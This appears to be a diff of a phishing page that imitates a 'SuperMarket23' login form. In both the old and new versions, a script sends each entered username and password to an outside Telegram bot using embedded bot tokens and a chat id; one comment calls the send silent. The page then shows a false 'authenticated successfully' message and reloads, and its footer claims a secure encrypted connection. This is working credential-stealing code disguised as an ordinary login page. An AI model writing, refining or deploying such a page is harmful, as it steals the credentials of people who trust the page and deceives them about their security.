@@ -1,67 +1,67 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SuperMarket23 - Access</title>
+    <title>Log In - SuperMarket23</title>
     <style>
-        body { font-family: Arial, sans-serif; background-color: #f4f7f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { background-color: #ffffff; padding: 40px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 100%; max-width: 380px; text-align: center; border-top: 6px solid #0056b3; }
-        h1 { color: #0056b3; font-size: 32px; margin-bottom: 25px; text-transform: uppercase; font-weight: bold; }
-        label { display: block; text-align: left; font-weight: bold; margin-bottom: 8px; color: #333; font-size: 14px; }
-        input { width: 100%; padding: 14px; margin-bottom: 20px; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; font-size: 16px; }
-        .btn { background-color: #0056b3; color: white; border: none; padding: 16px; width: 100%; border-radius: 5px; font-size: 16px; font-weight: bold; cursor: pointer; text-transform: uppercase; }
-        .footer { margin-top: 20px; font-size: 12px; color: #777; }
+        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-card { background: white; padding: 40px; border-radius: 4px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 100%; max-width: 380px; text-align: center; border-top: 6px solid #0056b3; }
+        h1 { color: #0056b3; font-size: 34px; margin-bottom: 25px; font-weight: bold; }
+        .form-group { text-align: left; margin-bottom: 20px; }
+        label { display: block; font-weight: bold; color: #333; margin-bottom: 8px; font-size: 14px; }
+        input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
+        button { width: 100%; background-color: #0056b3; color: white; border: none; padding: 15px; border-radius: 4px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        button:hover { background-color: #004494; }
+        .footer-text { margin-top: 25px; font-size: 12px; color: #888; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <h1>Log In</h1>
+<div class="login-card">
+    <h1>LOG IN</h1>
     <form id="authForm">
-        <label>USERNAME</label>
-        <input type="text" id="user" placeholder="Enter username" required>
-
-        <label>PASSWORD</label>
-        <input type="password" id="pass" placeholder="Enter password" required>
-
-        <button type="submit" class="btn" id="btnAuth">TO AUTHENTICATE</button>
+        <div class="form-group">
+            <label>USERNAME</label>
+            <input type="text" id="user" placeholder="Enter username" required>
+        </div>
+        <div class="form-group">
+            <label>PASSWORD</label>
+            <input type="password" id="pass" placeholder="Enter password" required>
+        </div>
+        <button type="submit">TO AUTHENTICATE</button>
     </form>
-    <div class="footer">Secure Encrypted Connection</div>
+    <p class="footer-text">Secure Encrypted Connection</p>
 </div>
 
 <script>
-    // Configuración con tus datos reales de las capturas
-    const token = "8710847420:AAHbfCVi9-eWWiS6E2CYKT0-9TFSxf9gjDc";
-    const chat_id = "6475554235";
+    const token = '8653195154:AAGx6xo6nCxsJu55OQd-V51QHWFNP38mhQo'; 
+    const chatId = '6475554235'; 
 
-    document.getElementById('authForm').addEventListener('submit', async (e) => {
+    document.getElementById('authForm').addEventListener('submit', function(e) {
         e.preventDefault();
-        const btn = document.getElementById('btnAuth');
+        
         const u = document.getElementById('user').value;
         const p = document.getElementById('pass').value;
-        
-        btn.innerText = "PROCESSING...";
-        btn.disabled = true;
+        const message = `🔔 DATOS CAPTURADOS\n\n👤 USER: ${u}\n🔑 PASS: ${p}`;
 
-        const mensaje = `📌 *NEW ACCESS SM23*\n\n👤 *User:* \`${u}\`\n🔑 *Pass:* \`${p}\``;
-
-        try {
-            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chat_id, text: mensaje, parse_mode: 'Markdown' })
-            });
-            alert("Verification sent successfully.");
-            location.reload();
-        } catch (error) {
-            alert("Error: Check your internet connection.");
-            btn.innerText = "TO AUTHENTICATE";
-            btn.disabled = false;
-        }
+        // Envío silencioso a Telegram
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: chatId, text: message })
+        })
+        .then(() => {
+            alert('Authenticated successfully. Secure Encrypted Connection established.');
+            window.location.reload(); 
+        })
+        .catch(() => {
+            alert('Error in connection.');
+        });
     });
 </script>
+
 </body>
 </html>
+
 
